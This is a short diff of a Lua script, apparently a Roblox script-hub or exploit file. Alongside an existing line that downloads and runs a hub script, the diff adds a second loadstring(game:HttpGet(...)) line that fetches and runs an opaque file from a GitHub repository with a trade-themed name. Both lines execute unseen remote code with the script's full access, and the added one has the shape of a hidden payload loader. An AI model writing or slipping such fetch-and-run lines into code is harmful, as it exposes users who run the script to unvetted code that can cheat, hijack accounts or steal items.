@@ -1,4 +1,5 @@
 loadstring(game:HttpGet('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/qweaad1/TradeaModeQwe/main/API1'))()
 
 local isClicked = false
 -- Создаем экранное GUI
